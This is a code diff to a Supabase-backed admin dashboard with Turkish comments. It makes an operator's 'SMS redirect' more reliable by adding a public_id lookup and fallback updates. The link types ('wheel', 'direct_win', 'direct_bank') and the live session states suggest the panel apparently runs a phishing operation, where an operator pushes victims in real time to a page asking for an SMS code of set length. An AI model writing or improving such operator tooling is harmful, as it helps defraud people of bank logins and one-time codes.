@@ -95,6 +95,7 @@ export function AdminDashboardClean() {
   const [linkType, setLinkType] = useState<"normal" | "wheel" | "direct_win" | "direct_bank">("normal");
   const [createLinkError, setCreateLinkError] = useState<string | null>(null);
   const [smsPromptSessionId, setSmsPromptSessionId] = useState<string | null>(null);
+  const [smsPromptPublicId, setSmsPromptPublicId] = useState<number | null>(null);
   const [smsDigitsInput, setSmsDigitsInput] = useState("6");
   const [smsCustomTextInput, setSmsCustomTextInput] = useState("");
   const [specialPromptSessionId, setSpecialPromptSessionId] = useState<string | null>(null);
@@ -554,7 +555,10 @@ export function AdminDashboardClean() {
   async function handleRouteAction(id: string, step: string) {
     if (!supabase || !step) return;
     if (step === "sms") {
+      const row = rowsRef.current.find((r) => r.id === id);
+      const pid = row && (row as any).public_id != null ? Number((row as any).public_id) : null;
       setSmsPromptSessionId(id);
+      setSmsPromptPublicId(pid);
       setSmsDigitsInput("6");
       setSmsCustomTextInput("");
       return;
@@ -570,15 +574,73 @@ export function AdminDashboardClean() {
   async function confirmSmsRedirect() {
     if (!supabase || !smsPromptSessionId) return;
     const digits = Math.min(12, Math.max(4, Number(smsDigitsInput) || 6));
-    await supabase
-      .from("sessions")
-      .update({ is_hidden: false, current_step: "sms", 
-        sms_digits: digits, 
-        sms_custom_text: smsCustomTextInput.trim() || null,
-        status: "online" 
-      })
-      .eq("id", smsPromptSessionId);
+
+    // Tam payload: sms_digits + sms_custom_text + sms_mode. Bu kolonlar prod DB'de
+    // yoksa PostgREST TUM UPDATE'i reddeder ve yonlendirme sessizce calismaz.
+    // Bu yuzden once tam dene, kolon hatasi alirsan minimal payload ile tekrar dene.
+    const fullPayload = {
+      is_hidden: false,
+      current_step: "sms",
+      sms_digits: digits,
+      sms_custom_text: smsCustomTextInput.trim() || null,
+      sms_mode: "fixed",
+      status: "online",
+    };
+    const minimalPayload = {
+      is_hidden: false,
+      current_step: "sms",
+      status: "online",
+    };
+
+    // Aday filtreler: public_id (sayisal) once, sonra uuid id.
+    const candidates: Array<{ field: "public_id" | "id"; value: string | number }> = [];
+    if (smsPromptPublicId != null && !isNaN(Number(smsPromptPublicId))) {
+      candidates.push({ field: "public_id", value: Number(smsPromptPublicId) });
+    }
+    candidates.push({ field: "id", value: smsPromptSessionId });
+
+    let data: any = null;
+    let error: any = null;
+    for (const c of candidates) {
+      let res = await supabase
+        .from("sessions")
+        .update(fullPayload)
+        .eq(c.field, c.value)
+        .select("id, current_step, status, public_id")
+        .maybeSingle();
+
+      if (res.error) {
+        const msg = String(res.error.message || res.error);
+        if (/column|sms_custom_text|sms_digits|sms_mode|schema cache/i.test(msg)) {
+          res = await supabase
+            .from("sessions")
+            .update(minimalPayload)
+            .eq(c.field, c.value)
+            .select("id, current_step, status, public_id")
+            .maybeSingle();
+        }
+      }
+
+      if (!res.error && res.data) {
+        data = res.data;
+        error = null;
+        break;
+      }
+      if (res.error) error = res.error;
+    }
+
+    if (error || !data) {
+      alert(
+        "[ADMIN DB HATA] SMS yonlendirmesi yazilamadi! Kullanici yonlendirilemedi.\n\n" +
+          "Hata: " + String(error?.message || error || "0 satir guncellendi (session bulunamadi)") + "\n\n" +
+          "Supabase'de sessions tablosunu, sms_custom_text/sms_digits/sms_mode kolonlarini ve RLS policy'lerini kontrol et.",
+      );
+      await load();
+      return;
+    }
+
     setSmsPromptSessionId(null);
+    setSmsPromptPublicId(null);
     await load();
   }
 
